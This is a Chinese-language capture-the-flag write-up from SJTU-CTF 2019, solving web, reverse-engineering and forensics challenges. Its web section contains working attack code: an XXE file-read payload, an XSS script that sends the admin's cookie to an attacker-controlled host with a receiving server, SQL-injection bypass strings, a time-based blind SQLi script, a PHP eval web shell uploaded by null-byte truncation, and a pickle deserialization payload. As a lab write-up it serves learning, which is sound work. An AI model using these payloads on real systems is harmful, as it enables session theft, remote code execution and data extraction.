# SJTU-CTF-2019-Write-Up

先说点闲话，总结一下。这是我第一次参加CTF比赛，也是第一次接触这一方面的知识。为期一周的挑战中，全程现学现卖，最终还是因为没有足够的知识储备和良好的工具而后继无力，止步2451分(Rank: 21)。这一周花费了很多时间在CTF上，~~拖欠了点作业~~，但好久没有这么充实了，而且学到了很多新知识，总的来说还是值得的，期待下一届*SJTU-CTF*！

## Web

### Basic web

按下F12，跟着hint做就可以了。

### ezxxe

题目提供了一个war包作为source code，解压后用*jd*反编译`Main.class`。

在`web.xml`中可以发现/parse路径将由`com.wu.ezxxe.Main`托管。查看反编译后的`Main.java`可以发现/parse路径接受一个post请求，将请求的body解析为xml，将根节点下的某些子节点转化为Map后输出。

通过搜索xml解析的漏洞可以发现*XXE*攻击，~~此时我才知道ezxxe是这个意思~~。

Talk is cheap, show me the code:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ctf [<!ENTITY  file SYSTEM "file:///flag/c38b07e91b0c15330e20693ed4443092">]>
<root><ctf>&file;</ctf></root>
```

注：此题有个坑，flag是个目录，`c38b07e91b0c15330e20693ed4443092`不是flag，~~对萌新不大友好~~。

### message board

作为一个萌新刚开始很奇怪为什么会出现`Report to admin if you like`。百思不得其解，只好利用搜索引擎从Chrome 77入手，最终了解了*XSS*攻击，还发现了[external link: XSS-Auditor: the-protector-of-unprotected](https://medium.com/bugbountywriteup/xss-auditor-the-protector-of-unprotected-f900a5e15b7b)。

思路如下：admin会访问一个包含你的report的界面，可在report中注入js获取cookie，利用上面的外部链接中提到的方法可以绕过report页面中删除flag的js代码。

Talk is cheap, show me the code:

`inject.js`:

```javascript
if(location.href.includes('xss'))location.href=`http://xx.xx.xx.xx:9876/?cookie=${JSON.stringify(document.cookie)}`;
```

`server.js`:

```javascript
const http = require('http')
const url = require('url')

http.createServer((req, res) => {
    console.log(JSON.parse(url.parse(req.url, true).query.cookie || "{}"))
    console.log(req.headers)
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('SJTU-CTF-2019 0ops!')
}).listen(9876)
```

`md5.py` for the captcha:

```python
import hashlib

i = 0
while True:
    hex = hashlib.md5(str(i).encode()).hexdigest()
    if hex.startswith('f601a2'):
        print(i)
        break
    i+=1
```

### Baby web

#### Part 1

按照hint找出过滤的内容后根据给出的source code针对性地注入即可。

过滤字符应该有：空格 , and or / && || (case insensitive)

未过滤字符有：mid substr ascii hex bin select user from where union like limit

```python
import clipboard

inject = r"a'union select 2 - '".replace(' ', chr(int('09', base=16)))
clipboard.copy(inject)
```

#### Part 2

成功登录后，并没有flag，提示可以上传图片。利用搜索引擎可以发现`0x00`截断法，使用*Burp Suite*拦截post请求，将`pa.phtml.png`的第二个`.(0x2E)`改为`0x00`，最终服务端的文件名为`pa.phtml`，访问此文件即可完成攻击。

`pa.phtml`:

```php
<?php @eval($_POST['c']);?>
```

#### Addition

放上一个用处不大的基于时间的盲注代码:

```python
import timeit
import requests


def measure_time(block):
    begin = timeit.default_timer()
    block()
    return timeit.default_timer() - begin

def send(pos, condition):
    inject = r"select(username)from`user`where(username='admin')".replace(
        ' ', chr(int('0a', base=16)))
    response = requests.post(
        r'http://111.186.57.85:10024/admin_l0gin_page.php',
        {'username': f"a'-(case((ascii(mid(({inject})from({pos}))){condition}))when(1)then(sleep(1))else(0)end)-'",
         'password': ''})
    return response

def blind(pos):
    s = ''
    a = 0
    b = 127
    while True:
        mid = int((a + b) / 2)
        if mid == 0:
            break
        if measure_time(lambda: send(pos, f'>={mid}')) < 1:
            b = mid
        elif measure_time(lambda: send(pos, f'<={mid}')) < 1:
            a = mid
        else:
            s = chr(mid)
            break
    return s

if __name__ == "__main__":
    s = ''
    pos = 1
    while True:
        c = blind(pos)
        if c == '':
            break
        else:
            s += c
            pos += 1
    print(s)
```

### upload lab

服务端是由*nginx*+*PHP*构成的，根据hint通过搜索引擎可以发现利用`.user.ini`的攻击方式。

在新版*PHP*环境中，默认`allow_url_include=false`，而且用户级别不可修改此配置，因此无法使用`auto_prepend_file="filter://read=convert.base64-decode/resource=inject.png"`来注入可以执行的*PHP*代码。最后直接盲猜flag位置：`auto_prepend_file="filter://read=convert.base64-decode/resource=/flag"`。

上传过程中有个问题使服务端会对文件内容进行过滤，具体过滤条件我不清楚，但是在`.user.ini`文件开头处插入字节`00 32 33 0A`即可绕过服务端的过滤。

## Reverse

### snake

用hex editor打开此文件，可以通过开头处的magic bytes识别出这是一个*python*的字节码。对使用*uncompyle6*反编译输出的*python* source code分析可得到正确的输入参数是`e4sy_py_dec0mpi1e`，将snake加上`.pyc`后缀直接用*python*运行即可。

## Misc

### sqlmap yibasuo

根据hint，在抓包数据中可以提取出flag。用*Wireshark*打开`sqlmap_yibasuo.pcapng`过滤出所有的post请求，可以发现在靠后的一部分出现了盲注的请求，从盲注的第一个请求开始，将所有出现`!=`的请求中`!=`后的数字(ascii code)按顺序记录下来，转换为字符串即可得到flag，~~没错我没写script，全手动~~。

### weird logo

用hex editor打开图片，可以发现文件最后有多余字节，根据标志性的`KP`猜测是按字节倒置的zip文件，检查后发现猜测正确。尝试多种方法破解zip文件都以失败告终，于是猜测图片中也有隐藏的信息，（一番搜索后），使用*Stegsolve.jar*打开图片，在gray bits模式下发现了类似二维码的形状，但是中间部分被污染了，于是将alpha, red, green, blue的plane 0分别输出成图片，通过ps拼接在一起，得到一个可以扫描的二维码，其内容即为zip的解压密码。

### animal

通过搜索引擎可以发现*pickle*反序列化的漏洞，初次尝试使用`__reduce__`绕过，但是`b'R'`被过滤，因此失败了。

后来改变思路，尝试一个比较简单的办法，使服务端反序列化的时候，使用服务端上的`favirote.name`和`favirote.category`分别作为`Animal`对象的两个属性的值。

Talk is cheap, show me the code:

```python
import base64
import pickle
import favorite


class Animal:
    def __init__(self, name, category):
        self.name = name
        self.category = category

    def __repr__(self):
        return f'Animal(name={self.name!r}, category={self.category!r})'

    def __eq__(self, other):
        return type(other) is Animal and self.name == other.name and self.category == other.category


animal = Animal(favorite.name, favorite.category)
pickle_data = base64.b64encode(pickle.dumps(animal)).decode()
print(pickle_data)
```

`favorite.py`:

```python
def name():
    pass


def category():
    pass
```

### anti-hack01

使用*volatility*读取memory dump，使用`pstree`和`filescan`等功能检查了notepad和一些可以的文件后都没有发现flag，最后只剩下了`mspaint.exe`，通过搜索引擎可以发现[external link: 利用volatility与Gimp实现Windows内存取证](https://segmentfault.com/a/1190000018813033)，按照步骤即可得到手画的flag，印象中还要进行翻转的操作，不过这些都是trivial。具体高度和宽度我不记得了，~~只记得当时调了好一会儿~~。

### dog

#### Layer 1

第一层其实是伪加密，用hex editor打开修改标记加密位置的字节后可以直接解压，也可以用`ZipCenOp.jar`自动完成，第一层解压后得到一个假的flag.txt和一个flag3.zip。

#### Layer 2

用hex editor打开flag3.zip，检查发现尾部由多余字节，将标记注释长度的字节改为恰当的值，得到zip文件注释，观察猜测是base64编码，尝试过base64, base32, base16后，base32的结果即为解压密码，第二层解压后得到一大堆二进制文件。

#### Layer 3

注意到除最后一个文件以外其他文件的大小刚好都是1K，因此从最后一个文件入手，用hex editor打开发现这是一个zip文件的尾部。打开第一个文件，发现并不是zip文件的头部（这里我被误导了，看见文件中出现了HUAWEI之类的字眼，我愚蠢地认为这是出题人拿服务端的log乱拼凑后放在前面有来掩人耳目的）于是写了个script提取后半部分的zip文件，打开后发现由一个flag.txt和一个flag.zip组成，此时我猜测要使用明文攻击，因为第一层和这一层的flag.txt的原始大小相同，然而我又被误导了，这里不满足明文攻击的使用条件。

无奈之下只好再从前半部分入手，惊讶地发现magic bytes是jpg文件的头部。将jpg文件导出后，按照图片中的提示将图片的位置信息作为解压密码即可成功解压，第三层解压后得到一个假的txt文件和一个flag.zip。

#### Layer 4

flag.zip的注释中提示密码为QQ号，那就直接用*archpr*来brute force吧！

Talk is cheap, show me the code:

`find_pk.py`:

```python
import os
from pathlib import Path

cwd = Path(os.getcwd())

for child in (cwd / 'small').iterdir():
    with open(child, 'rb') as f:
        if b'PK\x03\x04' in f.read():
            print(child)
```

`read_jpg.py`:

```python
import os
from pathlib import Path
import itertools

small = Path(os.getcwd()) / 'small'

with open('act.jpg', 'wb') as f:
    for child in itertools.chain(small.glob('flag??'), small.glob('flagzaa?'), small.glob('flagzab[a-r]')):
        with child.open('rb') as seg:
            f.write(seg.read())
    with (small / 'flagzabs').open('rb') as zabs:
        f.write(zabs.read(int('19C', base=16)))
```

`gps.py`:

```python
import exifread as ef

# barrowed from
# https://gist.github.com/snakeye/fdc372dbf11370fe29eb
def _convert_to_degress(value):
    """
    Helper function to convert the GPS coordinates stored in the EXIF to degress in float format
    :param value:
    :type value: exifread.utils.Ratio
    :rtype: float
    """
    d = float(value.values[0].num) / float(value.values[0].den)
    m = float(value.values[1].num) / float(value.values[1].den)
    s = float(value.values[2].num) / float(value.values[2].den)

    return d + (m / 60.0) + (s / 3600.0)


def getGPS(filepath):
    '''
    returns gps data if present other wise returns empty dictionary
    '''
    with open(filepath, 'rb') as f:
        tags = ef.process_file(f)
        latitude = tags.get('GPS GPSLatitude')
        latitude_ref = tags.get('GPS GPSLatitudeRef')
        longitude = tags.get('GPS GPSLongitude')
        longitude_ref = tags.get('GPS GPSLongitudeRef')
        if latitude:
            lat_value = _convert_to_degress(latitude)
            if latitude_ref.values != 'N':
                lat_value = -lat_value
        else:
            return {}
        if longitude:
            lon_value = _convert_to_degress(longitude)
            if longitude_ref.values != 'E':
                lon_value = -lon_value
        else:
            return {}
        return {'latitude': lat_value, 'longitude': lon_value}
    return {}


file_path = 'act.jpg'
gps = getGPS(file_path)
print(gps)
```
